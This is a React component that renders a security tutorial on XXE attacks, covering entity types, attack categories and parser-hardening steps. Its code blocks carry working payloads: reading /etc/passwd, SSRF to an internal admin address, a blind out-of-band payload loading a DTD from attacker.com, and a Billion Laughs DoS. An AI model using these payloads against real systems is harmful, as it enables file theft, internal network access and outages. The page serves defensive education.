import React from "react";

const XXE: React.FC = () => (
  <div className="p-8 space-y-8 rounded-xl shadow-lg mt-20">
    <h1 className="text-4xl font-extrabold border-b-2 pb-2">
      XML External Entity (XXE) Attacks
    </h1>
    <p className="text-sm text-gray-500">Last Updated: 17 Jan, 2026</p>

    <p className="text-lg leading-relaxed">
      XML External Entity (XXE) is an attack against applications that parse XML input. It occurs
      when XML input containing a reference to an external entity is processed by a weakly configured
      XML parser. XXE can lead to disclosure of confidential data, server-side request forgery (SSRF),
      and denial of service attacks.
    </p>

    <h2 className="text-3xl font-bold mt-8">How XXE Works</h2>
    <div className="bg-gray-100 text-gray-900 p-6 rounded-lg mt-4 font-mono text-sm text-gray-900">
      <pre className="whitespace-pre-wrap text-gray-900">
{`XML Entity Types:

1. INTERNAL ENTITY
   <!ENTITY name "value">
   Usage: &name;

2. EXTERNAL ENTITY (Dangerous!)
   <!ENTITY xxe SYSTEM "file:///etc/passwd">
   <!ENTITY xxe SYSTEM "http://attacker.com/steal">

3. PARAMETER ENTITY
   <!ENTITY % name "value">
   Usage: %name;

Basic XXE Attack:
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>

Result: Contents of /etc/passwd returned in response!`}
      </pre>
    </div>

    <h2 className="text-3xl font-bold mt-8">XXE Attack Types</h2>
    <div className="overflow-x-auto mt-4">
      <table className="min-w-full border border-gray-300 text-left">
        <thead className="bg-gray-200">
          <tr>
            <th className="p-3 border">Type</th>
            <th className="p-3 border">Description</th>
            <th className="p-3 border">Impact</th>
          </tr>
        </thead>
        <tbody className="bg-white text-gray-900">
          <tr>
            <td className="p-3 border font-semibold">Classic XXE</td>
            <td className="p-3 border">Data returned in response</td>
            <td className="p-3 border">File disclosure</td>
          </tr>
          <tr>
            <td className="p-3 border font-semibold">Blind XXE</td>
            <td className="p-3 border">Data exfiltrated externally</td>
            <td className="p-3 border">Out-of-band data theft</td>
          </tr>
          <tr>
            <td className="p-3 border font-semibold">Error-based</td>
            <td className="p-3 border">Data in error messages</td>
            <td className="p-3 border">Information leakage</td>
          </tr>
          <tr>
            <td className="p-3 border font-semibold">SSRF via XXE</td>
            <td className="p-3 border">Internal network access</td>
            <td className="p-3 border">Network scanning</td>
          </tr>
          <tr>
            <td className="p-3 border font-semibold">Billion Laughs</td>
            <td className="p-3 border">Recursive entity expansion</td>
            <td className="p-3 border">Denial of Service</td>
          </tr>
        </tbody>
      </table>
    </div>

    <h2 className="text-3xl font-bold mt-8">Attack Examples</h2>
    <div className="bg-gray-100 text-gray-900 p-4 rounded-lg mt-4 font-mono text-gray-900">
      <pre className="whitespace-pre-wrap text-gray-900">
{`1. FILE DISCLOSURE
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user><name>&xxe;</name></user>

2. SSRF (Internal Network Access)
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "http://192.168.1.1/admin">
]>
<data>&xxe;</data>

3. BLIND XXE (Out-of-Band)
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<data>&send;</data>

4. BILLION LAUGHS (DoS)
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;">
  ...exponential expansion...
]>
<data>&lol9;</data>`}
      </pre>
    </div>

    <h2 className="text-3xl font-bold mt-8">Prevention Methods</h2>
    <div className="bg-gray-100 text-gray-900 p-4 rounded-lg mt-4 font-mono text-gray-900">
      <pre className="whitespace-pre-wrap text-gray-900">
{`XXE Prevention Strategies:

1. DISABLE DTDs (Best Solution)
   // Java
   factory.setFeature(
     "http://apache.org/xml/features/disallow-doctype-decl",
     true);

   // Python (defusedxml)
   import defusedxml.ElementTree as ET

2. DISABLE EXTERNAL ENTITIES
   // Java
   factory.setFeature(
     "http://xml.org/sax/features/external-general-entities",
     false);

3. USE LESS COMPLEX DATA FORMATS
   - Prefer JSON over XML when possible
   - Use simple data structures

4. INPUT VALIDATION
   - Validate XML against schema
   - Whitelist expected elements

5. PATCH AND UPDATE
   - Keep XML libraries updated
   - Apply security patches promptly`}
      </pre>
    </div>

    <h2 className="text-3xl font-bold mt-8">Key Points to Remember</h2>
    <div className="bg-yellow-50 dark:bg-yellow-900/20 p-4 rounded-lg mt-4">
      <ul className="list-disc list-inside leading-relaxed space-y-2">
        <li>XXE exploits XML parsers that process external entities</li>
        <li>Disable DTD processing to prevent XXE attacks</li>
        <li>XXE can lead to file disclosure, SSRF, and DoS</li>
        <li>Use JSON instead of XML when possible</li>
        <li>Keep XML libraries and parsers updated</li>
        <li>Test applications with XXE payloads during security assessments</li>
      </ul>
    </div>
  </div>
);

export default XXE;
